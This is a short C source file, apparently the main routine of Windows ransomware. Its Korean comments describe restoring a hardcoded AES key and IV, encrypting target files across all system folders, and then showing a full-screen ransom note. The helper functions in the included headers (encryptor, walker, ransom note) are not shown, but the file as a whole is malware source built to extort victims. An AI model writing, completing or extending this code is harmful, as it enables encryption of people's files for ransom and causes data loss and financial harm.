#include <windows.h>
#include <stdio.h>
#include "encryptor.h"
#include "walker.h"
#include "ransomenote.h"

#define AES_KEY_SIZE 32
#define IV_SIZE 16
#define FILENAME_PADDING 512  // 경로까지 포함할 수 있도록 확장

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
    unsigned char aes_key[AES_KEY_SIZE];
    unsigned char iv[IV_SIZE];

    // 1. 하드코딩된 키/IV 복원
    restore_key(aes_key);
    restore_iv(iv);

    // 2. 전체 시스템 폴더에서 암호화 수행 (경로 포함 저장 방식)
    encrypt_all_targets(aes_key, iv);

    // 3. 랜섬노트 전체화면 경고창
    create_ransom_note();

    return 0;
}
